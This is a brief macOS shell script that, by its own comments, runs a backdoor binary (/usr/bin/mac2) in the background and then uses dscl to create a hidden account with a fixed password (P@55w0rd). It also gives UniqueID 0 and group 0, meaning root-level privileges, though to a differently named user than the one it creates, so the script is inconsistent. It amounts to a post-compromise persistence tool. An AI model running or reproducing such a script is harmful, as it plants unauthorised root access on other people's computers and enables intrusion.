#!/bin/sh
#run Backdoor
/usr/bin/mac2 &
#create user account with admin privs
dscl . -create /Users/dark
dscl . -create /Users/dark UserShell /bin/bash
dscl . -create /Users/toddharris RealName "Darkoperator"
dscl . -create /Users/toddharris UniqueID 0
dscl . -create /Users/toddharris PrimaryGroupID 0
dscl . -passwd /Users/dark P@55w0rd
#

